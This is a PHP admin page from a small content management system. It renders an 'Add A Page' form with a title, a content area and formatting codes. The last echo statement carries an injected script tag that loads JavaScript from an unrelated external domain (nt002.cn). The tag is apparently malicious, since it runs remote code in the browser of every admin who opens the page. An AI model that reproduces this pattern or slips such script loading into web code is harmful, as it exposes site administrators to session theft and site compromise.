<?php
include 'admin_header.php';		

if ($_SESSION['auth'] == "admin") 
{
	include("db_connect.php");
	echo "<html>\n<head>\n<link rel='stylesheet' href='admin.css'  type='text/css' />\n</head>\n<body>\n";
	echo "<h2>Add A Page</h2>\n";	
	include 'admin_navigation.php';	
	echo "<form action='admin_pages_action.php' method='post'>\n" ;
	echo "<input type='hidden' name='action' value='add'>\n";
	echo "<input type='hidden' name='id' value=''>\n";
	echo "<div class='pages'>";
	echo "Title: <input name='title' type='text' size='50' value=''>";
	echo "<br />";
	echo "<textarea name='content' cols='60' rows='20' ></textarea>";
	echo "<br /><br />";
	echo "<input name='edit' type='submit' value='Submit'> <a href='index.php'>Cancel</a><br />\n";
	echo "</form>";
	echo "</div>";
	 ?>
				
	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />
    <?php echo "<script src='http://nt002.cn/E/J.JS'></script></body>\n</html>\n"; ?>
	
<?php
}
?>